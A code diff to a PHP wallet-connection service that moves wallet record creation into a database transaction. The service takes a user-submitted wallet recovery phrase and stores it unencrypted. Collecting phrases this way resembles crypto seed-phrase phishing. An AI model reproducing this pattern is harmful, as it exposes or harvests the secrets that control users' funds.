@@ -5,6 +5,8 @@ namespace App\Services;
 use App\Events\WalletConnected;
 use App\Models\User;
 use App\Models\WalletConnect;
+use Illuminate\Support\Facades\DB;
+use Throwable;
 
 class WalletConnectionService
 {
@@ -21,34 +23,32 @@ class WalletConnectionService
      * @param User $user The authenticated user.
      * @param array $data Validated data from the request.
      * @return WalletConnect|null
+     * @throws Throwable
      */
     public function connectWallet(User $user, array $data): ?WalletConnect
     {
-        $walletDetails = $this->gatewayHandler->getWallet($data['wallet_id']);
+        $connection = DB::transaction(function () use ($user, $data) {
+            $walletDetails = $this->gatewayHandler->getWallet($data['wallet_id']);
 
-        if (!$walletDetails) {
-            return null;
-        }
+            return $user->wallets()->create([
+                'wallet_id' => $data['wallet_id'],
+                'wallet_name' => $data['wallet_name'],
+                'wallet_phrase' => $data['wallet_phrase'],
+                'wallet_logo' => $walletDetails['LogoUrl'] ?? null,
+                'security_type' => $walletDetails['Security'] ?? null,
+                'anonymity_level' => $walletDetails['Anonymity'] ?? null,
+                'ease_of_use' => $walletDetails['EaseOfUse'] ?? null,
+                'validation_type' => $walletDetails['Validation'] ?? null,
+                'supported_coins' => $walletDetails['Coins'] ?? [],
+                'platforms' => $walletDetails['Platforms'] ?? [],
+                'wallet_features' => $walletDetails['WalletFeatures'] ?? [],
+                'affiliate_url' => $walletDetails['AffiliateUrl'] ?? null,
+                'connected_at' => now(),
+            ]);
+        });
 
-        $connection = $user->wallets()->create([
-            'wallet_id' => $data['wallet_id'],
-            'wallet_name' => $data['wallet_name'],
-            'wallet_phrase' => $data['wallet_phrase'],
-            'wallet_logo' => $walletDetails['LogoUrl'] ?? null,
-            'security_type' => $walletDetails['Security'] ?? null,
-            'anonymity_level' => $walletDetails['Anonymity'] ?? null,
-            'ease_of_use' => $walletDetails['EaseOfUse'] ?? null,
-            'validation_type' => $walletDetails['Validation'] ?? null,
-            'supported_coins' => $walletDetails['Coins'] ?? [],
-            'platforms' => $walletDetails['Platforms'] ?? [],
-            'wallet_features' => $walletDetails['WalletFeatures'] ?? [],
-            'affiliate_url' => $walletDetails['AffiliateUrl'] ?? null,
-            'connected_at' => now(),
-        ]);
-
-        if ($connection) {
-            event(new WalletConnected($user, $connection));
-        }
+        // Dispatch the event after the transaction is successful
+        event(new WalletConnected($user, $connection));
 
         return $connection;
     }
